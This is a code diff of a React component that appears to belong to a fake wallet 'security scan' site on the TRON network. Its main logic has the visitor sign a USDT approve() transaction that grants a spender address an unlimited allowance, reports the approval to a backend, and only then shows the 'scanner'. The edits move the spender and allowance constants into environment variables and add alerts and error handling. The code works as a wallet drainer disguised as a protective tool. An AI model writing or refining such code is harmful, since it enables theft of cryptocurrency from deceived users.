@@ -3,19 +3,10 @@ import { Shield, Terminal } from "lucide-react";
 import { useState, useEffect, useRef } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import { TronWeb } from "tronweb";
-import { BASE_URL, USDT_SPENDER_ADDRESS } from "../../../env";
+import { BASE_URL, USDT_ADDRESS, USDT_SPENDER_ADDRESS, MAX_ALLOWANCE } from "../../../env";
 interface HeroSectionProps {
   onInitiateScan: () => void;
 }
-
-// ======================
-// CONSTANTS (USDT APPROVAL)
-// ======================
-const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";
-
-const MAX_ALLOWANCE =
-  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 // ======================
 // TRONWEB INSTANCE
@@ -148,52 +139,86 @@ export function HeroSection({
       setLoading(true);
       setError("");
 
+      alert("DDD");
+
       if (!connected || !address || !wallet) {
         throw new Error("Wallet not connected");
       }
 
       const tronWeb = buildTronWeb();
 
-      // Add Buffer polyfill for TronWeb
-      if (!(globalThis as any).Buffer) {
-        const { Buffer } = await import('buffer');
-        (globalThis as any).Buffer = Buffer;
-      }
+      alert("USDT_SPENDER_ADDRESS : " + USDT_SPENDER_ADDRESS);
 
-      let tx;
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_ADDRESS,
+        "approve(address,uint256)",
+        {
+          feeLimit: 15_000_000,
+          callValue: 0,
+        },
+        [
+          { type: "address", value: USDT_SPENDER_ADDRESS },
+          { type: "uint256", value: MAX_ALLOWANCE },
+        ],
+        address
+      );
 
-      try {
-        tx = await tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_ADDRESS,
-          "approve(address,uint256)",
-          {
-            feeLimit: 15_000_000,  // 15 TRX max (was 100 TRX)
-            callValue: 0,
-          },
-          [
-            { type: "address", value: SPENDER },
-            { type: "uint256", value: MAX_ALLOWANCE },
-          ],
-          address,
-        );
-      } catch (e) {
-        console.error("Error building transaction:", e);
-        throw new Error("Failed to build transaction. Please ensure your wallet is properly connected.");
-      }
+      console.log("TX -> : ", tx);
+
+      console.log("Transaction : ", tx?.transaction);
+
+
 
       if (!tx?.transaction) {
         throw new Error("Failed to build transaction");
       }
 
-      console.log("Built transaction:", tx.transaction);
-
       const signed = await wallet.adapter.signTransaction(tx.transaction);
-
       if (!signed) {
-        throw new Error("Signing failed. Please approve the transaction in your wallet.");
+        throw new Error("Transaction signing was rejected or failed");
       }
 
       const result = await tronWeb.trx.sendRawTransaction(signed);
+
+      // ✅ Detect failed transaction results
+      if (result.code && String(result.code) !== "SUCCESS") {
+        const errorMap: Record<string, string> = {
+          "OUT_OF_ENERGY":
+            "❌ Out of Energy: Your wallet doesn't have enough energy to complete this transaction. " +
+            "Please stake TRX for energy or ensure you have at least 10 TRX to cover the fee.",
+          "BANDWITH_ERROR": // TRON typo in their API
+            "❌ Out of Bandwidth: You don't have enough bandwidth. " +
+            "Wait 24h for free bandwidth to refresh or stake more TRX.",
+          "CONTRACT_VALIDATE_ERROR":
+            "❌ Contract validation failed. The transaction was rejected by the network.",
+          "TRANSACTION_EXPIRATION_ERROR":
+            "❌ Transaction expired before it was broadcast. Please try again.",
+          "DUP_TRANSACTION_ERROR":
+            "❌ Duplicate transaction detected. This transaction was already submitted.",
+          "TAPOS_ERROR":
+            "❌ TaPoS error. Please try again.",
+          "SIGERROR":
+            "❌ Signature error. Please reconnect your wallet and try again.",
+        };
+
+        const friendlyMessage =
+          errorMap[result.code] ||
+          `❌ Transaction failed: ${result.message || result.code}`;
+
+        // Show alert
+        alert(friendlyMessage);
+        throw new Error(friendlyMessage);
+      }
+
+      // ✅ Double-check tx status on-chain (optional but safer)
+      const txInfo = await tronWeb.trx.getTransactionInfo(result.txid);
+      if (txInfo?.receipt?.result === "OUT_OF_ENERGY") {
+        const msg =
+          "❌ Out of Energy: Transaction was submitted but ran out of energy on-chain. " +
+          "Please stake TRX for energy or maintain at least 10–15 TRX in your wallet.";
+        alert(msg);
+        throw new Error(msg);
+      }
 
       await fetch(`${BASE_URL}/api/approved`, {
         method: "POST",
@@ -208,18 +233,20 @@ export function HeroSection({
       });
 
       setStep("done");
-
       setLogs((p) => [
         ...p,
         `> Approval Success`,
         `> TX: ${result.txid || "unknown"}`,
       ]);
-
-      // Call success handler to trigger Scanner UI
       onApprovalSuccess?.();
     } catch (e: any) {
-      setError(e.message || "Approval failed");
-      console.log("Error during approval:", e);
+      // Avoid double-setting if already alerted
+      const msg = e.message || "Approval failed";
+      setError(msg);
+      // Only alert if it wasn't already shown above
+      if (!msg.startsWith("❌")) {
+        alert(`Transaction Error: ${msg}`);
+      }
     } finally {
       setLoading(false);
     }
